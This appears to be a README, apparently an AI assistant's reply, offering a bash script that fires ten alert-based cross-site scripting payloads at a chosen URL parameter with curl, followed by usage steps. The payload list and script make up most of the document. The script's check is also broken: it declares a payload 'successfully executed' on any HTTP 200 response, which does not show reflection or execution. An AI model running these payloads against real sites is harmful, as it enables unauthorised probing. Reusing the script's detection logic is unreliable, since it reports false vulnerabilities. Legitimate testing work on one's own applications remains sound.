# XSS-Testing-Script
Here’s a **bash script** to automate **Cross-Site Scripting (XSS) testing** on a target URL. This script uses **curl** for HTTP requests and tests various XSS payloads against the provided URL.

---

### **XSS Testing Script**

```bash
#!/bin/bash

# XSS Testing Script
# Usage: ./xss_test.sh <target_url> <parameter_name>
# Example: ./xss_test.sh "https://example.com/search" "q"

# Check for arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <parameter_name>"
    exit 1
fi

# Target URL and Parameter
TARGET_URL=$1
PARAM_NAME=$2

# XSS Payloads
PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<body onload=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "<input autofocus onfocus=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# Test each payload
echo "Testing for XSS vulnerabilities on $TARGET_URL..."
for PAYLOAD in "${PAYLOADS[@]}"; do
    echo "Testing payload: $PAYLOAD"
    
    # URL Encode the payload
    ENCODED_PAYLOAD=$(echo "$PAYLOAD" | jq -sRr @uri)

    # Send request
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?$PARAM_NAME=$ENCODED_PAYLOAD")

    # Check response
    if [[ $RESPONSE -eq 200 ]]; then
        echo "Payload successfully executed: $PAYLOAD"
    else
        echo "No response or blocked: $PAYLOAD"
    fi
done

echo "XSS testing completed."
```

---

### **Steps to Use the Script**
1. Save the script as `xss_test.sh`.
2. Make the script executable:
   ```bash
   chmod +x xss_test.sh
   ```
3. Run the script with the target URL and parameter:
   ```bash
   ./xss_test.sh "https://example.com/search" "query"
   ```

---

### **Features of the Script**
1. **Payload Encoding**: Automatically encodes payloads to ensure proper injection.
2. **HTTP Status Code Check**: Verifies if the payload was processed (200 OK status).
3. **Customizable Payloads**: You can easily add more payloads to the `PAYLOADS` array.

---

Would you like to extend this script with features like logging, reporting, or integration with tools like **Burp Suite**?
